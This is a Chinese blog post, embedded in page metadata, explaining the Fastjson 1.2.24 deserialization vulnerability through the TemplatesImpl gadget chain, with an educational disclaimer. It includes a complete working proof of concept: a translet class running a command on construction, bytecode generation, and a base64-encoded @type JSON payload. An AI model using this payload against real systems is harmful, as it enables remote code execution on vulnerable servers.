<!doctype html><html lang=zh dir=auto>
<head><meta charset=utf-8>
<meta http-equiv=x-ua-compatible content="IE=edge">
<meta name=viewport content="width=device-width,initial-scale=1,shrink-to-fit=no">
<meta name=robots content="index, follow">
<title>Java 反序列化漏洞原理（三）fastjson 1.2.24 Templateslmpl 利用原理 | 没有理想的人不伤心</title><meta name=keywords content="Java,反序列化,fastjson">
<meta name=description content="声明 本文章中所有内容仅供学习交流，严禁用于非法用途，否则由此产生的一切后果均与作者无关。
Fastjson 是什么  fastjson是阿里巴巴的开源JSON解析库，它可以解析JSON格式的字符串，支持将Java Bean序列化为JSON字符串，也可以从JSON字符串反序列化到JavaBean。
  fastjson相对其他JSON库的特点是快。fastjson在阿里巴巴大规模使用，在数万台服务器上部署，fastjson在业界被广泛接受。在2012年被开源中国评选为最受欢迎的国产开源软件之一。
 以上摘自Fastjson GitHub 介绍。
但近年来随着 Fastjson 不断爆出漏洞，各大中小型公司都逐渐弃用 Fastjson ，甚至阿里自己开源的服务注册、配置管理平台 NACOS 在 1.3.0 版本之后都从 Fastjson 替换为了 Jackson (详见 https://github.com/alibaba/nacos/releases/tag/1.3.0) ，可见漏洞危害之大。
为什么会弃用 Fastjson ？ 想要研究一个产品的漏洞其中有一条很好的途径就是去查询 CVE 编号，但是我在检索之后发现 Fastjson 只有 CVE-2017-18349 这一条，而 Jackson 竟然有高达 76 条。
这能否证明 Fastjson 比 Jackson 更安全呢？答案并不是，都是半斤八两，有些 Fastjson 里面出现的漏洞在 Jackson 里面也同样存在。
那为什么会有公司弃用 Fastjson 呢？
或许是 Jackson 有更完善且公开的漏洞管理机制，或许是国外的月亮比较圆，或许是随大流，也或许是 Fastjson 代码质量不过关（知乎上有很多回答批判 Fastjson 代码糟糕的），真实原因就不得而知了。
尽管近年来有公司不断弃用 Fastjson ，但还有很多公司在使用，并且已经开发上线的系统想要替换或者升级 Fastjson 还需要时间，因此我们很有必要学习一下 Fastjson 漏洞的产因。
Fastjson 漏洞产生原因 Fastjson 第一次被爆出有漏洞是官方在2017年3月15日主动披露的，详见 https://github.">
<meta name=author content="dushixiang">
<link rel=canonical href=https://typesafe.cn/posts/java-serialization-vulnerability-3/>
<link crossorigin=anonymous href=/assets/css/stylesheet.min.c88963fe2d79462000fd0fb1b3737783c32855d340583e4523343f8735c787f0.css integrity="sha256-yIlj/i15RiAA/Q+xs3N3g8MoVdNAWD5FIzQ/hzXHh/A=" rel="preload stylesheet" as=style>
<script defer crossorigin=anonymous src=/assets/js/highlight.min.4dcb3c4f38462f66c6b6137227726f5543cb934cca9788f041c087e374491df2.js integrity="sha256-Tcs8TzhGL2bGthNyJ3JvVUPLk0zKl4jwQcCH43RJHfI=" onload=hljs.initHighlightingOnLoad()></script>
<link rel=icon href=https://typesafe.cn/favicon.ico>
<link rel=icon type=image/png sizes=16x16 href=https://typesafe.cn/favicon-16x16.png>
<link rel=icon type=image/png sizes=32x32 href=https://typesafe.cn/favicon-32x32.png>
<link rel=apple-touch-icon href=https://typesafe.cn/apple-touch-icon.png>
<link rel=mask-icon href=https://typesafe.cn/safari-pinned-tab.svg>
<meta name=theme-color content="#2e2e33">
<meta name=msapplication-TileColor content="#2e2e33">
<noscript>
<style>#theme-toggle,.top-link{display:none}</style><style>@media(prefers-color-scheme:dark){:root{--theme:rgb(29, 30, 32);--entry:rgb(46, 46, 51);--primary:rgb(218, 218, 219);--secondary:rgb(155, 156, 157);--tertiary:rgb(65, 66, 68);--content:rgb(196, 196, 197);--hljs-bg:rgb(46, 46, 51);--code-bg:rgb(55, 56, 62);--border:rgb(51, 51, 51)}.list{background:var(--theme)}.list:not(.dark)::-webkit-scrollbar-track{background:0 0}.list:not(.dark)::-webkit-scrollbar-thumb{border-color:var(--theme)}}</style></noscript><meta property="og:title" content="Java 反序列化漏洞原理（三）fastjson 1.2.24 Templateslmpl 利用原理">
<meta property="og:description" content="声明 本文章中所有内容仅供学习交流，严禁用于非法用途，否则由此产生的一切后果均与作者无关。
Fastjson 是什么  fastjson是阿里巴巴的开源JSON解析库，它可以解析JSON格式的字符串，支持将Java Bean序列化为JSON字符串，也可以从JSON字符串反序列化到JavaBean。
  fastjson相对其他JSON库的特点是快。fastjson在阿里巴巴大规模使用，在数万台服务器上部署，fastjson在业界被广泛接受。在2012年被开源中国评选为最受欢迎的国产开源软件之一。
 以上摘自Fastjson GitHub 介绍。
但近年来随着 Fastjson 不断爆出漏洞，各大中小型公司都逐渐弃用 Fastjson ，甚至阿里自己开源的服务注册、配置管理平台 NACOS 在 1.3.0 版本之后都从 Fastjson 替换为了 Jackson (详见 https://github.com/alibaba/nacos/releases/tag/1.3.0) ，可见漏洞危害之大。
为什么会弃用 Fastjson ？ 想要研究一个产品的漏洞其中有一条很好的途径就是去查询 CVE 编号，但是我在检索之后发现 Fastjson 只有 CVE-2017-18349 这一条，而 Jackson 竟然有高达 76 条。
这能否证明 Fastjson 比 Jackson 更安全呢？答案并不是，都是半斤八两，有些 Fastjson 里面出现的漏洞在 Jackson 里面也同样存在。
那为什么会有公司弃用 Fastjson 呢？
或许是 Jackson 有更完善且公开的漏洞管理机制，或许是国外的月亮比较圆，或许是随大流，也或许是 Fastjson 代码质量不过关（知乎上有很多回答批判 Fastjson 代码糟糕的），真实原因就不得而知了。
尽管近年来有公司不断弃用 Fastjson ，但还有很多公司在使用，并且已经开发上线的系统想要替换或者升级 Fastjson 还需要时间，因此我们很有必要学习一下 Fastjson 漏洞的产因。
Fastjson 漏洞产生原因 Fastjson 第一次被爆出有漏洞是官方在2017年3月15日主动披露的，详见 https://github.">
<meta property="og:type" content="article">
<meta property="og:url" content="https://typesafe.cn/posts/java-serialization-vulnerability-3/"><meta property="og:image" content="https://typesafe.cn/papermod-cover.png"><meta property="article:section" content="posts">
<meta property="article:published_time" content="2021-10-21T22:56:00+08:00">
<meta property="article:modified_time" content="2021-10-21T22:56:00+08:00">
<meta name=twitter:card content="summary_large_image">
<meta name=twitter:image content="https://typesafe.cn/papermod-cover.png">
<meta name=twitter:title content="Java 反序列化漏洞原理（三）fastjson 1.2.24 Templateslmpl 利用原理">
<meta name=twitter:description content="声明 本文章中所有内容仅供学习交流，严禁用于非法用途，否则由此产生的一切后果均与作者无关。
Fastjson 是什么  fastjson是阿里巴巴的开源JSON解析库，它可以解析JSON格式的字符串，支持将Java Bean序列化为JSON字符串，也可以从JSON字符串反序列化到JavaBean。
  fastjson相对其他JSON库的特点是快。fastjson在阿里巴巴大规模使用，在数万台服务器上部署，fastjson在业界被广泛接受。在2012年被开源中国评选为最受欢迎的国产开源软件之一。
 以上摘自Fastjson GitHub 介绍。
但近年来随着 Fastjson 不断爆出漏洞，各大中小型公司都逐渐弃用 Fastjson ，甚至阿里自己开源的服务注册、配置管理平台 NACOS 在 1.3.0 版本之后都从 Fastjson 替换为了 Jackson (详见 https://github.com/alibaba/nacos/releases/tag/1.3.0) ，可见漏洞危害之大。
为什么会弃用 Fastjson ？ 想要研究一个产品的漏洞其中有一条很好的途径就是去查询 CVE 编号，但是我在检索之后发现 Fastjson 只有 CVE-2017-18349 这一条，而 Jackson 竟然有高达 76 条。
这能否证明 Fastjson 比 Jackson 更安全呢？答案并不是，都是半斤八两，有些 Fastjson 里面出现的漏洞在 Jackson 里面也同样存在。
那为什么会有公司弃用 Fastjson 呢？
或许是 Jackson 有更完善且公开的漏洞管理机制，或许是国外的月亮比较圆，或许是随大流，也或许是 Fastjson 代码质量不过关（知乎上有很多回答批判 Fastjson 代码糟糕的），真实原因就不得而知了。
尽管近年来有公司不断弃用 Fastjson ，但还有很多公司在使用，并且已经开发上线的系统想要替换或者升级 Fastjson 还需要时间，因此我们很有必要学习一下 Fastjson 漏洞的产因。
Fastjson 漏洞产生原因 Fastjson 第一次被爆出有漏洞是官方在2017年3月15日主动披露的，详见 https://github.">
<script type=application/ld+json>{"@context":"https://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":2,"name":"Posts","item":"https://typesafe.cn/posts/"},{"@type":"ListItem","position":3,"name":"Java 反序列化漏洞原理（三）fastjson 1.2.24 Templateslmpl 利用原理","item":"https://typesafe.cn/posts/java-serialization-vulnerability-3/"}]}</script>
<script type=application/ld+json>{"@context":"https://schema.org","@type":"BlogPosting","headline":"Java 反序列化漏洞原理（三）fastjson 1.2.24 Templateslmpl 利用原理","name":"Java 反序列化漏洞原理（三）fastjson 1.2.24 Templateslmpl 利用原理","description":"声明 本文章中所有内容仅供学习交流，严禁用于非法用途，否则由此产生的一切后果均与作者无关。\nFastjson 是什么  fastjson是阿里巴巴的开源JSON解析库，它可以解析JSON格式的字符串，支持将Java Bean序列化为JSON字符串，也可以从JSON字符串反序列化到JavaBean。\n  fastjson相对其他JSON库的特点是快。fastjson在阿里巴巴大规模使用，在数万台服务器上部署，fastjson在业界被广泛接受。在2012年被开源中国评选为最受欢迎的国产开源软件之一。\n 以上摘自Fastjson GitHub 介绍。\n但近年来随着 Fastjson 不断爆出漏洞，各大中小型公司都逐渐弃用 Fastjson ，甚至阿里自己开源的服务注册、配置管理平台 NACOS 在 1.3.0 版本之后都从 Fastjson 替换为了 Jackson (详见 https://github.com/alibaba/nacos/releases/tag/1.3.0) ，可见漏洞危害之大。\n为什么会弃用 Fastjson ？ 想要研究一个产品的漏洞其中有一条很好的途径就是去查询 CVE 编号，但是我在检索之后发现 Fastjson 只有 CVE-2017-18349 这一条，而 Jackson 竟然有高达 76 条。\n这能否证明 Fastjson 比 Jackson 更安全呢？答案并不是，都是半斤八两，有些 Fastjson 里面出现的漏洞在 Jackson 里面也同样存在。\n那为什么会有公司弃用 Fastjson 呢？\n或许是 Jackson 有更完善且公开的漏洞管理机制，或许是国外的月亮比较圆，或许是随大流，也或许是 Fastjson 代码质量不过关（知乎上有很多回答批判 Fastjson 代码糟糕的），真实原因就不得而知了。\n尽管近年来有公司不断弃用 Fastjson ，但还有很多公司在使用，并且已经开发上线的系统想要替换或者升级 Fastjson 还需要时间，因此我们很有必要学习一下 Fastjson 漏洞的产因。\nFastjson 漏洞产生原因 Fastjson 第一次被爆出有漏洞是官方在2017年3月15日主动披露的，详见 https://github.","keywords":["Java","反序列化","fastjson"],"articleBody":"声明 本文章中所有内容仅供学习交流，严禁用于非法用途，否则由此产生的一切后果均与作者无关。\nFastjson 是什么  fastjson是阿里巴巴的开源JSON解析库，它可以解析JSON格式的字符串，支持将Java Bean序列化为JSON字符串，也可以从JSON字符串反序列化到JavaBean。\n  fastjson相对其他JSON库的特点是快。fastjson在阿里巴巴大规模使用，在数万台服务器上部署，fastjson在业界被广泛接受。在2012年被开源中国评选为最受欢迎的国产开源软件之一。\n 以上摘自Fastjson GitHub 介绍。\n但近年来随着 Fastjson 不断爆出漏洞，各大中小型公司都逐渐弃用 Fastjson ，甚至阿里自己开源的服务注册、配置管理平台 NACOS 在 1.3.0 版本之后都从 Fastjson 替换为了 Jackson (详见 https://github.com/alibaba/nacos/releases/tag/1.3.0) ，可见漏洞危害之大。\n为什么会弃用 Fastjson ？ 想要研究一个产品的漏洞其中有一条很好的途径就是去查询 CVE 编号，但是我在检索之后发现 Fastjson 只有 CVE-2017-18349 这一条，而 Jackson 竟然有高达 76 条。\n这能否证明 Fastjson 比 Jackson 更安全呢？答案并不是，都是半斤八两，有些 Fastjson 里面出现的漏洞在 Jackson 里面也同样存在。\n那为什么会有公司弃用 Fastjson 呢？\n或许是 Jackson 有更完善且公开的漏洞管理机制，或许是国外的月亮比较圆，或许是随大流，也或许是 Fastjson 代码质量不过关（知乎上有很多回答批判 Fastjson 代码糟糕的），真实原因就不得而知了。\n尽管近年来有公司不断弃用 Fastjson ，但还有很多公司在使用，并且已经开发上线的系统想要替换或者升级 Fastjson 还需要时间，因此我们很有必要学习一下 Fastjson 漏洞的产因。\nFastjson 漏洞产生原因 Fastjson 第一次被爆出有漏洞是官方在2017年3月15日主动披露的，详见 https://github.com/alibaba/fastjson/wiki/security_update_20170315 。漏洞影响 1.2.24 以及之前的版本。我们今天来研究一下当 fastjson version 我们先在 pom.xml 中增加 fastjson 1.2.24 的依赖。\n  com.alibaba  fastjson  1.2.24  下面先看一个最常见的序列化为JSON和反序列化为对象的过程。\n首先定义一个常见的 Java 对象。\npublic class User {  private String name;  private Integer age;   public String getName() {  System.out.println(\"call getName\");  return name;  }   public void setName(String name) {  System.out.println(\"call setName\");  this.name = name;  }   public Integer getAge() {  System.out.println(\"call getAge\");  return age;  }   public void setAge(Integer age) {  System.out.println(\"call setAge\");  this.age = age;  }   @Override  public String toString() {  return \"User{\" +  \"name='\" + name + '\\'' +  \", age=\" + age +  '}';  } } 编写一个测试类\nimport com.alibaba.fastjson.JSON;  public class Eval0 {   public static void main(String[] args) {  User user = new User();  user.setName(\"守法市民小杜\");  user.setAge(26);   String jsonString = JSON.toJSONString(user);  System.out.println(\"序列化后: \" + jsonString);   System.out.println(\"反序列化开始\");  System.out.println(\"反序列化: \" + JSON.parseObject(jsonString, User.class));  System.out.println(\"反序列化结束\");  } } 代码很简单，运行后会输出：\ncall setName call setAge call getAge call getName 序列化后: {\"age\":26,\"name\":\"守法市民小杜\"} 反序列化开始 call setAge call setName 反序列化: User{name='守法市民小杜', age=26} 反序列化结束 可以看到 Fastjson 在将JSON字符串反序列化为 Java 对象的时候调用了 set方法，看过《Java 反序列化漏洞原理》前两篇文章的同学可能会思考，我们能否构建一条利用链，让 Fastjson 在执行 set 方法的时候能够执行我们指定的命令。\n我们先假设这个方式成立，但目前存在两个问题：\n 如何让 Fastjson 将JSON字符串反序列化为我们指定的对象？ 哪一个对象可以在 set 的时候执行我们指定的命令呢？  第一个问题查看 Fastjson 文档后可以得到答案，当 JSON 字符串的第一个 key 为 @type 时，会将 JSON 字符串反序列化为 @type 对应 value 中指定的 Java 类，这就是 Fastjson 的 AutoType 功能。并且 Fastjson 在反序列化带有 @type 的 JSON 字符串时，如果没有指定Java对象的类型，还会调用其成员变量的 get 方法。\n我们稍微改动一下测试类，在序列化为JSON时将类型也写进去，在反序列化时将类型去除：\nimport com.alibaba.fastjson.JSON; import com.alibaba.fastjson.serializer.SerializerFeature;  public class Eval1 {   public static void main(String[] args) {  User user = new User();  user.setName(\"守法市民小杜\");  user.setAge(26);   String jsonString = JSON.toJSONString(user, SerializerFeature.WriteClassName);  System.out.println(\"序列化后: \" + jsonString);   System.out.println(\"反序列化开始\");  System.out.println(\"反序列化: \" + JSON.parseObject(jsonString));  System.out.println(\"反序列化结束\");  } } 执行后会输出：\ncall setName call setAge call getAge call getName 序列化后: {\"@type\":\"cn.typesafe.jsv.fastjson.User\",\"age\":26,\"name\":\"守法市民小杜\"} 反序列化开始 call setAge call setName call getAge call getName 反序列化: {\"name\":\"守法市民小杜\",\"age\":26} 反序列化结束 可以看到确实是调用了 Java 对象的 get 方法，所以如果 get 方法能够触发代码执行也是可以的。\nTemplatesImpl 的利用链 扩大条件后，第二个问题研究安全的前辈也已经帮我们找到了一个合适的 Java 对象 com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl。\n它的成员变量如下：\npublic final class TemplatesImpl implements Templates, Serializable {  static final long serialVersionUID = 673094361519270707L;  public final static String DESERIALIZE_TRANSLET = \"jdk.xml.enableTemplatesImplDeserialization\";   // 父抽象类的完整包名称  private static String ABSTRACT_TRANSLET  = \"com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet\";  // 不重要，只要不为空就行  private String _name = null;  // 存放字节数组的数组  private byte[][] _bytecodes = null;  // Class 数组  private Class[] _class = null;  // translet 子类在 _class 中的下标  private int _transletIndex = -1;  // 存放 class 的容器，可以忽略  private Hashtable _auxClasses = null;  // 此字段不能为 null，因为要让 Fastjson 调用 getOutputProperties 方法  private Properties _outputProperties;   // 其他成员变量可以忽略  } 我们首先就来看 _outputProperties 对应的 getOutputProperties 方法：\npublic synchronized Properties getOutputProperties() {  try {  return newTransformer().getOutputProperties();  }  catch (TransformerConfigurationException e) {  return null;  } } 代码很简单，重要的是 newTransformer() 方法，代码如下：\npublic synchronized Transformer newTransformer()  throws TransformerConfigurationException {  TransformerImpl transformer;  transformer = new TransformerImpl(getTransletInstance(), _outputProperties,  _indentNumber, _tfactory);   if (_uriResolver != null) {  transformer.setURIResolver(_uriResolver);  }   if (_tfactory.getFeature(XMLConstants.FEATURE_SECURE_PROCESSING)) {  transformer.setSecureProcessing(true);  }  return transformer; } 其中 getTransletInstance() 代码如下：\nprivate Translet getTransletInstance()  throws TransformerConfigurationException {  try {  // _name 不能为 null，不然就直接返回了  if (_name == null) return null;  // _class 不能赋值，要进入 defineTransletClasses 才能将我们准备的 Class 加载进来  if (_class == null) defineTransletClasses();   // 从加载成功的Class中找到 AbstractTranslet 的子类使用反射创建对象，newInstance() 会调用默认的无参构造方法，因此只要在构造方法中添加我们需要的代码就能做到任意代码执行  AbstractTranslet translet = (AbstractTranslet) _class[_transletIndex].newInstance();  // 下面的代码不重要了  translet.postInitialization();  translet.setTemplates(this);  translet.setServicesMechnism(_useServicesMechanism);  translet.setAllowedProtocols(_accessExternalStylesheet);  if (_auxClasses != null) {  translet.setAuxiliaryClasses(_auxClasses);  }   return translet;  }  catch (InstantiationException e) {  ErrorMsg err = new ErrorMsg(ErrorMsg.TRANSLET_OBJECT_ERR, _name);  throw new TransformerConfigurationException(err.toString());  }  catch (IllegalAccessException e) {  ErrorMsg err = new ErrorMsg(ErrorMsg.TRANSLET_OBJECT_ERR, _name);  throw new TransformerConfigurationException(err.toString());  } } defineTransletClasses() 方法代码如下：\nprivate void defineTransletClasses()  throws TransformerConfigurationException {   // _bytecodes 不能为 null  if (_bytecodes == null) {  ErrorMsg err = new ErrorMsg(ErrorMsg.NO_TRANSLET_CLASS_ERR);  throw new TransformerConfigurationException(err.toString());  }   // 获取类加载器  TransletClassLoader loader = (TransletClassLoader)  AccessController.doPrivileged(new PrivilegedAction() {  public Object run() {  return new TransletClassLoader(ObjectFactory.findClassLoader());  }  });   try {  // 获取二维数组的长度，一个字节数组对应一个 Class  final int classCount = _bytecodes.length;  _class = new Class[classCount];   // 判断 Class 数量长度大于1就初始化一个容器用于存放 Class，对我们来说没啥用，可以忽略  if (classCount  1) {  _auxClasses = new Hashtable();  }   for (int i = 0; i  classCount; i++) {  // 使用类加载器将字节数组加载为 Class  _class[i] = loader.defineClass(_bytecodes[i]);  // 获取其父类 Class  final Class superClass = _class[i].getSuperclass();   // 判断当前 Class 的父类 Class 名称是否为 com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet  if (superClass.getName().equals(ABSTRACT_TRANSLET)) {  // 赋值 translet Class 在数组中的下标  _transletIndex = i;  }  else {  // 存储 Class 名称及 Class，对我们来说没啥用，可以忽略  _auxClasses.put(_class[i].getName(), _class[i]);  }  }   if (_transletIndex  0) {  ErrorMsg err= new ErrorMsg(ErrorMsg.NO_MAIN_TRANSLET_ERR, _name);  throw new TransformerConfigurationException(err.toString());  }  }  catch (ClassFormatError e) {  ErrorMsg err = new ErrorMsg(ErrorMsg.TRANSLET_CLASS_ERR, _name);  throw new TransformerConfigurationException(err.toString());  }  catch (LinkageError e) {  ErrorMsg err = new ErrorMsg(ErrorMsg.TRANSLET_OBJECT_ERR, _name);  throw new TransformerConfigurationException(err.toString());  } } 到目前为止，基本的利用链我们已经搞清楚了，先让 Fastjson 在反序列化的时候将 TemplatesImpl 的几个关键成员变量赋值，如将 _bytecodes 字段赋值为我们事先准备好的字节数组，这样在 Fastjson 调用 getTransletInstance 的时候会接着调用 defineTransletClasses 方法将字节数组使用类加载器加载对 Class，完成之后会再找到 class 数组 _class 中 AbstractTranslet 的子类 Class 使用反射调用无参构造方法创建对象，而这个对象是我们可以控制的，在其构造方法中添加任意代码完成利用。\n但是还有三个问题：\n 如何将 Java Class 文件转换为字节？ 如何将 Java Class 字节序列化为 Fastjson 可以识别的 JSON 内容？ com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl 中我们需要操作的那几个成员变量都是以下划线为开头的，并且只有 get 方法没有 set 方法，Fastjson 要如何进行反序列化？  第一个问题我们可以直接使用 IO 流将 Java Class 文件读取到字节数组中，但这样太过粗暴且不利于移植，因此我们可以使用操作 Java 字节码库 javassist 来获取 Class 字节数组。\n第二个问题需要我们将 Class 字节数组进行 Base64 编码，Fastjson 在反序列化的时候会自动进行解码。\n第三个问题需要我们在反序列化JSON字符串时指定 Fastjson 支持没有 set 方法的成员变量，因此也注定了此种方式可利用范围较小。\n测试 在 pom.xml 中增加 javassist 依赖。\n org.javassist javassist 3.28.0-GA  编写测试代码：\nimport com.alibaba.fastjson.JSON; import com.alibaba.fastjson.parser.Feature; import com.sun.org.apache.xalan.internal.xsltc.DOM; import com.sun.org.apache.xalan.internal.xsltc.TransletException; import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet; import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator; import com.sun.org.apache.xml.internal.serializer.SerializationHandler; import javassist.ClassPool; import javassist.CtClass; import java.io.IOException; import java.util.Base64; import java.util.Collections; import java.util.LinkedHashMap; import java.util.Map; public class Eval2 { public static class EvalTransletClass extends AbstractTranslet { public EvalTransletClass() throws IOException { Runtime.getRuntime().exec(\"calc\"); } @Override public void transform(DOM document, SerializationHandler[] handlers) throws TransletException { } @Override public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException { } } public static void main(String[] args) throws Exception { // 读取编译后的 class 文件为字节数组 ClassPool classPool = ClassPool.getDefault(); final CtClass ctClass = classPool.get(EvalTransletClass.class.getName()); final byte[] bytes = ctClass.toBytecode(); // 将 class 字节数组编码为 base64 final String byteCode = Base64.getEncoder().encodeToString(bytes); // 构造 POC，这里使用 LinkedHashMap 是因为要保证顺序，@type 要放到第一位 final MappocMap = new LinkedHashMap(); pocMap.put(\"@type\", \"com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl\"); pocMap.put(\"_bytecodes\", Collections.singletonList(byteCode)); pocMap.put(\"_name\", \"守法市民小杜\"); pocMap.put(\"_outputProperties\", new Object()); pocMap.put(\"_tfactory\", new Object()); final String poc = JSON.toJSONString(pocMap); System.out.println(\"POC JSON:\"+poc); // POC JSON:{\"@type\":\"com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl\",\"_bytecodes\":[\"yv66vgAAADQAMQoABgAhCgAiACMIACQKACIAJQcAJwcAKAEABjxpbml0PgEAAygpVgEABENvZGUBAA9MaW5lTnVtYmVyVGFibGUBABJMb2NhbFZhcmlhYmxlVGFibGUBAAR0aGlzAQARRXZhbFRyYW5zbGV0Q2xhc3MBAAxJbm5lckNsYXNzZXMBADJMY24vdHlwZXNhZmUvanN2L2Zhc3Rqc29uL0V2YWwyJEV2YWxUcmFuc2xldENsYXNzOwEACkV4Y2VwdGlvbnMHACkBAAl0cmFuc2Zvcm0BAHIoTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007W0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7KVYBAAhkb2N1bWVudAEALUxjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NOwEACGhhbmRsZXJzAQBCW0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7BwAqAQAQTWV0aG9kUGFyYW1ldGVycwEApihMY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTtMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9kdG0vRFRNQXhpc0l0ZXJhdG9yO0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7KVYBAAhpdGVyYXRvcgEANUxjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL2R0bS9EVE1BeGlzSXRlcmF0b3I7AQAHaGFuZGxlcgEAQUxjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7AQAKU291cmNlRmlsZQEACkV2YWwyLmphdmEMAAcACAcAKwwALAAtAQAEY2FsYwwALgAvBwAwAQAwY24vdHlwZXNhZmUvanN2L2Zhc3Rqc29uL0V2YWwyJEV2YWxUcmFuc2xldENsYXNzAQBAY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL3J1bnRpbWUvQWJzdHJhY3RUcmFuc2xldAEAE2phdmEvaW8vSU9FeGNlcHRpb24BADljb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvVHJhbnNsZXRFeGNlcHRpb24BABFqYXZhL2xhbmcvUnVudGltZQEACmdldFJ1bnRpbWUBABUoKUxqYXZhL2xhbmcvUnVudGltZTsBAARleGVjAQAnKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1Byb2Nlc3M7AQAeY24vdHlwZXNhZmUvanN2L2Zhc3Rqc29uL0V2YWwyACEABQAGAAAAAAADAAEABwAIAAIACQAAAEAAAgABAAAADiq3AAG4AAISA7YABFexAAAAAgAKAAAADgADAAAAFgAEABcADQAYAAsAAAAMAAEAAAAOAAwADwAAABAAAAAEAAEAEQABABIAEwADAAkAAAA/AAAAAwAAAAGxAAAAAgAKAAAABgABAAAAHQALAAAAIAADAAAAAQAMAA8AAAAAAAEAFAAVAAEAAAABABYAFwACABAAAAAEAAEAGAAZAAAACQIAFAAAABYAAAABABIAGgADAAkAAABJAAAABAAAAAGxAAAAAgAKAAAABgABAAAAIgALAAAAKgAEAAAAAQAMAA8AAAAAAAEAFAAVAAEAAAABABsAHAACAAAAAQAdAB4AAwAQAAAABAABABgAGQAAAA0DABQAAAAbAAAAHQAAAAIAHwAAAAIAIAAOAAAACgABAAUAJgANAAk=\"],\"_name\":\"守法市民小杜\",\"_outputProperties\":{}} // 反序列化为 Java 对象 JSON.parseObject(poc, Feature.SupportNonPublicField); } } 运行之后将会看到弹出了计算器。\n注 文中测试使用系统和工具版本如下：\n 操作系统 windows 10 20H2 jdk java 1.8.0_301 fastjson 1.2.24 javassist 3.28.0-GA 代码仓库 https://github.com/dushixiang/java-serialization-vulnerability  其他 此种方式可利用范围较小，但在高版本JDK上依然可以利用成功。\n常见的 Fastjson 漏洞利用还有 RMI/JNDI 和 LDAP，但在高版本的JDK中，Java官方觉得请求远程地址上的类是一个很危险的操作，所以在最新的JDK中默认关闭了这个功能，我们在后面也会详细介绍。\n","wordCount":"995","inLanguage":"zh","datePublished":"2021-10-21T22:56:00+08:00","dateModified":"2021-10-21T22:56:00+08:00","author":{"@type":"Person","name":"dushixiang"},"mainEntityOfPage":{"@type":"WebPage","@id":"https://typesafe.cn/posts/java-serialization-vulnerability-3/"},"publisher":{"@type":"Organization","name":"没有理想的人不伤心","logo":{"@type":"ImageObject","url":"https://typesafe.cn/favicon.ico"}}}</script>
</head><body id=top>
<script>localStorage.getItem("pref-theme")==="dark"?document.body.classList.add("dark"):localStorage.getItem("pref-theme")==="light"?document.body.classList.remove("dark"):window.matchMedia("(prefers-color-scheme: dark)").matches&&document.body.classList.add("dark")</script>
<header class=header>
<nav class=nav>
<div class=logo>
<a href=https://typesafe.cn accesskey=h title="没有理想的人不伤心 (Alt + H)">没有理想的人不伤心</a>
<span class=logo-switches>
<button id=theme-toggle accesskey=t title="(Alt + T)"><svg id="moon" xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 12.79A9 9 0 1111.21 3 7 7 0 0021 12.79z"/></svg><svg id="sun" xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="5"/><line x1="12" y1="1" x2="12" y2="3"/><line x1="12" y1="21" x2="12" y2="23"/><line x1="4.22" y1="4.22" x2="5.64" y2="5.64"/><line x1="18.36" y1="18.36" x2="19.78" y2="19.78"/><line x1="1" y1="12" x2="3" y2="12"/><line x1="21" y1="12" x2="23" y2="12"/><line x1="4.22" y1="19.78" x2="5.64" y2="18.36"/><line x1="18.36" y1="5.64" x2="19.78" y2="4.22"/></svg>
</button>
</span>
</div><ul id=menu>
<li>
<a href=https://typesafe.cn/archives title=文章>
<span>文章</span>
</a>
</li><li>
<a href=https://typesafe.cn/categories/ title=分类>
<span>分类</span>
</a>
</li><li>
<a href=https://typesafe.cn/search/ title=搜索>
<span>搜索</span>
</a>
</li><li>
<a href=https://typesafe.cn/tags/ title=标签>
<span>标签</span>
</a>
</li></ul></nav></header><main class=main>
<article class=post-single>
<header class=post-header>
<div class=breadcrumbs><a href=https://typesafe.cn>主页</a>&nbsp;»&nbsp;<a href=https://typesafe.cn/posts/>Posts</a></div><h1 class=post-title>
Java 反序列化漏洞原理（三）fastjson 1.2.24 Templateslmpl 利用原理
</h1><div class=post-meta><span title="2021-10-21 22:56:00 +0800 +0800">十月 21, 2021</span>&nbsp;·&nbsp;5 分钟&nbsp;·&nbsp;dushixiang&nbsp;|&nbsp;<a href=https://github.com/adityatelange/hugo-PaperMod/tree/exampleSite/content/posts/java-serialization-vulnerability-3.md rel="noopener noreferrer" target=_blank>Suggest Changes</a>
</div></header><div class=toc>
<details>
<summary accesskey=c title="(Alt + C)">
<span class=details>目录</span>
</summary>
